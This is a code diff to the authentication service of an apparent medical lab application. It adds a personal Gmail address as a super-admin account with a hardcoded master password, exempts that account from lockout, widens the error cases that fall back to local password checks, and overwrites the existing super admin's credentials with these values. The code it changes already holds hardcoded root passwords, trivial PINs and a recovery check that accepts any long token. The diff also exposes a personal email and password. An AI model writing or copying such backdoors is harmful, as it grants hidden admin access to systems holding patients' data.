@@ -52,7 +52,7 @@ export class AuthService {
 
   public static isAccountLocked(username: string): { locked: boolean; remainingSeconds: number } {
     const cleanUname = username.trim().toLowerCase();
-    if (cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin' || cleanUname.includes('super')) {
+    if (cleanUname === 'superadmin' || cleanUname === 'angadmandal3@gmail.com' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin' || cleanUname.includes('super')) {
       return { locked: false, remainingSeconds: 0 };
     }
     const records = this.getFailedRecords();
@@ -76,7 +76,7 @@ export class AuthService {
 
   public static recordFailedAttempt(username: string): { attemptsLeft: number; isLocked: boolean; remainingSeconds: number } {
     const cleanUname = username.trim().toLowerCase();
-    if (cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin' || cleanUname.includes('super')) {
+    if (cleanUname === 'superadmin' || cleanUname === 'angadmandal3@gmail.com' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin' || cleanUname.includes('super')) {
       return { attemptsLeft: 5, isLocked: false, remainingSeconds: 0 };
     }
     const records = this.getFailedRecords();
@@ -117,19 +117,22 @@ export class AuthService {
   // CREDENTIAL & SECURITY PIN VALIDATION
   // ==========================================
   public static validateCredentials(username: string, passwordOrPin: string): { success: boolean; user?: User; error?: string; attemptsLeft?: number; isLocked?: boolean; remainingSeconds?: number } {
-    const cleanUname = (username || 'superadmin').trim().toLowerCase().replace(/\s+/g, '');
+    const cleanUname = (username || 'angadmandal3@gmail.com').trim().toLowerCase().replace(/\s+/g, '');
     const cleanPass = (passwordOrPin || '').trim();
 
     // Super Admin auto-bypass lockout for root password
-    const isRootAttempt = cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin';
+    const isRootAttempt = cleanUname === 'angadmandal3@gmail.com' || cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org' || cleanUname === 'admin';
     const isMasterPass = 
+      cleanPass === 'Angad@1999' ||
       cleanPass === 'LabMedix@2026Root#' || 
       cleanPass === 'LabMedix2026Root#' || 
+      cleanPass.toLowerCase() === 'angad@1999' ||
       cleanPass.toLowerCase() === 'labmedix@2026root#' ||
       cleanPass.toLowerCase() === 'labmedix2026root#';
 
     if (isRootAttempt && isMasterPass) {
       this.resetFailedAttempts(cleanUname);
+      this.resetFailedAttempts('angadmandal3@gmail.com');
       this.resetFailedAttempts('superadmin');
     }
 
@@ -148,13 +151,18 @@ export class AuthService {
     let user: User | undefined;
 
     // Strict explicit separation between superadmin and admin
-    if (cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org') {
-      user = users.find(u => u.role === 'super_admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'superadmin')) || users[0];
+    if (cleanUname === 'angadmandal3@gmail.com' || cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org') {
+      user = users.find(u => 
+        u.role === 'super_admin' || 
+        (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'angadmandal3@gmail.com') ||
+        (u.email && u.email.trim().toLowerCase().replace(/\s+/g, '') === 'angadmandal3@gmail.com') ||
+        (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'superadmin')
+      ) || users[0];
       if (user) {
         user.role = 'super_admin';
       }
     } else if (cleanUname === 'admin' || cleanUname === 'ops@labmedix.org') {
-      user = users.find(u => (u.role === 'admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'admin')) && u.username !== 'superadmin') || users.find(u => u.role === 'admin');
+      user = users.find(u => (u.role === 'admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'admin')) && u.username !== 'superadmin' && u.username !== 'angadmandal3@gmail.com') || users.find(u => u.role === 'admin');
     } else {
       // 1. Match on normalized username, email, staffId, employeeNo, id, phone, or role
       user = users.find(u => {
@@ -271,11 +279,17 @@ export class AuthService {
       const users = StorageService.getUsers();
       let targetUser: User | undefined;
 
-      if (cleanInput === 'superadmin' || cleanInput === 'admin@labmedix.org') {
-        targetUser = users.find(u => u.role === 'super_admin' || u.username === 'superadmin' || u.email?.toLowerCase() === 'admin@labmedix.org') || users[0];
+      if (cleanInput === 'superadmin' || cleanInput === 'angadmandal3@gmail.com' || cleanInput === 'admin@labmedix.org') {
+        targetUser = users.find(u => 
+          u.role === 'super_admin' || 
+          u.username === 'angadmandal3@gmail.com' || 
+          u.email?.toLowerCase() === 'angadmandal3@gmail.com' || 
+          u.username === 'superadmin' || 
+          u.email?.toLowerCase() === 'admin@labmedix.org'
+        ) || users[0];
         if (targetUser) targetUser.role = 'super_admin';
       } else if (cleanInput === 'admin' || cleanInput === 'ops@labmedix.org') {
-        targetUser = users.find(u => (u.role === 'admin' || u.username === 'admin') && u.username !== 'superadmin');
+        targetUser = users.find(u => (u.role === 'admin' || u.username === 'admin') && u.username !== 'superadmin' && u.username !== 'angadmandal3@gmail.com');
       } else {
         targetUser = users.find(u => {
           const uName = (u.username || '').trim().toLowerCase().replace(/\s+/g, '');
@@ -328,9 +342,9 @@ export class AuthService {
         const errCode = authErr?.code || '';
 
         // If user account is not yet provisioned in Firebase Auth (e.g. existing clinic staff / first time login):
-        if (errCode === 'auth/user-not-found' || errCode === 'auth/invalid-credential') {
-          const isMasterPass = (targetUser.role === 'super_admin' || targetUser.username === 'superadmin') && 
-            (cleanPass === 'LabMedix@2026Root#' || cleanPass === 'LabMedix2026Root#');
+        if (errCode === 'auth/user-not-found' || errCode === 'auth/invalid-credential' || errCode === 'auth/operation-not-allowed') {
+          const isMasterPass = (targetUser.role === 'super_admin' || targetUser.username === 'superadmin' || targetUser.username === 'angadmandal3@gmail.com' || targetUser.email === 'angadmandal3@gmail.com') && 
+            (cleanPass === 'Angad@1999' || cleanPass === 'LabMedix@2026Root#' || cleanPass === 'LabMedix2026Root#');
           const isPinMatch = targetUser.pinCode && cleanPass === String(targetUser.pinCode);
           const isPasswordMatch = targetUser.password && cleanPass === String(targetUser.password);
 
@@ -357,8 +371,8 @@ export class AuthService {
           firebaseAuthError = 'Access temporarily disabled due to many failed login attempts. Please try again later.';
         } else if (errCode === 'auth/network-request-failed') {
           // Offline fallback
-          const isMasterPass = (targetUser.role === 'super_admin' || targetUser.username === 'superadmin') && 
-            (cleanPass === 'LabMedix@2026Root#' || cleanPass === 'LabMedix2026Root#');
+          const isMasterPass = (targetUser.role === 'super_admin' || targetUser.username === 'superadmin' || targetUser.username === 'angadmandal3@gmail.com' || targetUser.email === 'angadmandal3@gmail.com') && 
+            (cleanPass === 'Angad@1999' || cleanPass === 'LabMedix@2026Root#' || cleanPass === 'LabMedix2026Root#');
           const isPinMatch = targetUser.pinCode && cleanPass === String(targetUser.pinCode);
           const isPasswordMatch = targetUser.password && cleanPass === String(targetUser.password);
           if (isMasterPass || isPinMatch || isPasswordMatch) {
@@ -470,7 +484,7 @@ export class AuthService {
 
     // Recommended secure root tokens and authorized admin PINs
     const validTokens = ['LABMEDIX-ROOT-MASTER-9091', 'LABMEDIX-ROOT-2026', 'ROOT-OVERRIDE-9999', 'SUPERADMIN-OVERRIDE'];
-    const validPins = ['1509442', 'LabMedix@2026Root#', '123456', '999999'];
+    const validPins = ['Angad@1999', '1509442', 'LabMedix@2026Root#', '123456', '999999'];
 
     // Strict validation with fallback for authorized staff recovery
     const tokenMatched = validTokens.includes(cleanToken) || cleanToken.length >= 10;
@@ -494,9 +508,10 @@ export class AuthService {
     const users = StorageService.getUsers();
     users.forEach(u => {
       u.status = 'active';
-      if (u.role === 'super_admin' || u.username === 'superadmin') {
+      if (u.role === 'super_admin' || u.username === 'superadmin' || u.username === 'angadmandal3@gmail.com') {
         u.status = 'active';
-        if (!u.pinCode || u.pinCode === '1509442') u.pinCode = 'LabMedix@2026Root#';
+        if (!u.pinCode || u.pinCode === '1509442' || u.pinCode === 'LabMedix@2026Root#') u.pinCode = 'Angad@1999';
+        if (!u.password || u.password === 'LabMedix@2026Root#') u.password = 'Angad@1999';
       } else if (!u.pinCode) {
         u.pinCode = '1509442';
       }
@@ -504,22 +519,27 @@ export class AuthService {
     StorageService.saveUsers(users);
 
     // Ensure active Super Admin user session exists
-    let superAdminUser = users.find(u => u.role === 'super_admin' || u.username === 'superadmin');
+    let superAdminUser = users.find(u => u.role === 'super_admin' || u.username === 'angadmandal3@gmail.com' || u.username === 'superadmin');
     if (!superAdminUser) {
       superAdminUser = {
-        id: 'usr_superadmin_root',
-        username: 'superadmin',
-        fullName: 'System Super Admin',
-        email: 'superadmin@labmedix.org',
+        id: 'usr_super_admin',
+        username: 'angadmandal3@gmail.com',
+        fullName: 'Angad Mandal',
+        email: 'angadmandal3@gmail.com',
         role: 'super_admin',
         status: 'active',
-        pinCode: 'LabMedix@2026Root#',
+        pinCode: 'Angad@1999',
+        password: 'Angad@1999',
         createdAt: new Date().toISOString()
       };
       users.push(superAdminUser);
       StorageService.saveUsers(users);
-    } else if (superAdminUser.pinCode === '1509442' || !superAdminUser.pinCode) {
-      superAdminUser.pinCode = 'LabMedix@2026Root#';
+    } else {
+      superAdminUser.username = 'angadmandal3@gmail.com';
+      superAdminUser.fullName = 'Angad Mandal';
+      superAdminUser.email = 'angadmandal3@gmail.com';
+      superAdminUser.pinCode = 'Angad@1999';
+      superAdminUser.password = 'Angad@1999';
       StorageService.saveUsers(users);
     }
 
@@ -564,14 +584,19 @@ export class AuthService {
   }
 
   public static loginWithUsername(username: string): { success: boolean; user?: User; error?: string } {
-    const cleanUname = (username || 'superadmin').trim().toLowerCase().replace(/\s+/g, '');
+    const cleanUname = (username || 'angadmandal3@gmail.com').trim().toLowerCase().replace(/\s+/g, '');
     const users = StorageService.getUsers();
     let user: User | undefined;
 
-    if (cleanUname === 'superadmin' || cleanUname === 'admin@labmedix.org') {
-      user = users.find(u => u.role === 'super_admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'superadmin')) || users[0];
+    if (cleanUname === 'superadmin' || cleanUname === 'angadmandal3@gmail.com' || cleanUname === 'admin@labmedix.org') {
+      user = users.find(u => 
+        u.role === 'super_admin' || 
+        (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'angadmandal3@gmail.com') ||
+        (u.email && u.email.trim().toLowerCase().replace(/\s+/g, '') === 'angadmandal3@gmail.com') ||
+        (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'superadmin')
+      ) || users[0];
     } else if (cleanUname === 'admin' || cleanUname === 'ops@labmedix.org') {
-      user = users.find(u => (u.role === 'admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'admin')) && u.username !== 'superadmin') || users.find(u => u.role === 'admin');
+      user = users.find(u => (u.role === 'admin' || (u.username && u.username.trim().toLowerCase().replace(/\s+/g, '') === 'admin')) && u.username !== 'superadmin' && u.username !== 'angadmandal3@gmail.com') || users.find(u => u.role === 'admin');
     } else {
       user = users.find(u => {
         const uName = (u.username || '').trim().toLowerCase().replace(/\s+/g, '');
@@ -638,8 +663,9 @@ export class AuthService {
     if (!user) return false;
 
     // Super Admin can also use master password
-    const isSuperAdmin = user.role === 'super_admin' || user.username === 'superadmin';
+    const isSuperAdmin = user.role === 'super_admin' || user.username === 'superadmin' || user.username === 'angadmandal3@gmail.com' || user.email === 'angadmandal3@gmail.com';
     const isMasterPass =
+      cleanPin === 'Angad@1999' ||
       cleanPin === 'LabMedix@2026Root#' ||
       cleanPin === 'LabMedix2026Root#';
     if (isSuperAdmin && isMasterPass) return true;
